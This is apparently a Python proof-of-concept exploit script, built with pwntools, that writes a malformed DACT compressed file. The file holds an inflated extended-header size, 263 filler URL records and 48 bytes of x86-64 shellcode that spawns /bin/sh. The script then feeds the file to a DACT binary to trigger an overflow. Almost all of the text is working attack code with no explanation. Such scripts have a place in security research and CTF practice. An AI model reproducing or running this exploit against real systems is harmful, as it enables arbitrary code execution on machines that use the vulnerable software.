#!/usr/bin/env python3
import sys
import os
from pwn import *

def write_fixed_header(fd) :
    fd.write(b"\x44\x43\x54\xc3")                    # magic[4]
    fd.write(b"\x00\x08\x2a")                        # version[3]
    fd.write(b"\x00\x00\x00\x00\xff\xff\xff\xff")    # filesize[8]
    fd.write(b"\x10\x00\x00\x00")                    # blk_cnt[4]
    fd.write(b"\x10\x00\x00\x00")                    # blksize_uncomp[4]
    fd.write(b"\x00")                                # file_opts[1]
    fd.write(b"\x00\x00\x04\x4f")    # file_extd_size[4] << Important

def write_url_data(fd) :
    for i in range(0, 263) :
        fd.write(b"\x07")                            # ch[1] (DACT_HDR_URL)
        fd.write(b"\x00\x01")                        # x[2] (size 1)
        fd.write(b"a")                               # dummy data

    fd.write(b"\x07")
    fd.write(b"\x00\x30")
    # shellcode[48]
    #fd.write(b'jhH\xb8/bin//shPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05')
    fd.write(b"\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05")

if __name__ == "__main__" :
    fd = open("./test.dct", "wb")
    write_fixed_header(fd)
    write_url_data(fd)
    fd.close()
    os.system("./dact_exploit -dcf test.dct")

